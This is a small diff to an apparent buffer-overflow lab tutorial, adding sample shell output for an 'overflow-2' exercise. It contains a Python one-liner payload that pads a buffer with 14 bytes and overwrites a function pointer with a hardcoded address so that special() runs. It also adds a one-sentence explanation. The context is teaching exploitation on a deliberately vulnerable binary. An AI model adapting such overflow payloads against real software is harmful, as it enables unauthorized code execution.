@@ -513,6 +513,10 @@ python3 -c 'print("A"*14 + "\x67\x05\x40\x00\x00\x00\x00\x00")' | ./func-pointer
 
 You should see: 
 ```
+[... overflow-2]$ python --version
+Python 2.7.18
+[... overflow-2]$ python -c 'print("A"*14 + "\x67\x05\x40\x00\x00\x00\x00\x00")' | ./func-pointer
 this is the special function
 you did this, friend!
 ```
+What this does is it fills buffer to limit 14 then fills the location of the variable with the location for special() and it runs
